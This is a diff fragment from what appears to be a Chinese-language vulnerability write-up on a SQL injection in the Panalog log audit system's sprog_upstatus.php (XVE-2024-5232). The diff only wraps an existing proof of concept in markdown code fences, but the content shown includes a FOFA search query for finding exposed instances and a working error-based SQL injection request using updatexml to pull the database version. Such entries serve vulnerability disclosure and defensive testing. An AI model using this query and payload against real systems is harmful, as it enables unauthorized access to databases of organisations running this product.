@@ -76,6 +76,7 @@ FOFA：body="Maintain/cloud_index.php"
 
 POC/EXP：
 
+```http
 GET /Maintain/sprog_upstatus.php?status=1&rdb=1&id=1%20and%20updatexml(1,concat(0x7e,version(),0x7e),1) HTTP/1.1
 Host: 127.0.0.1
 Connection: keep-alive
@@ -90,6 +91,8 @@ Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
 Accept-Encoding: gzip, deflate, br, zstd
 Accept-Language: zh-CN,zh;q=0.9
+```
+
 
 ![image-20240804122552780](./.resource/Panalog日志审计系统sprog_upstatus.phpSQL注入漏洞XVE-2024-5232/media/image-20240804122552780.png)
 
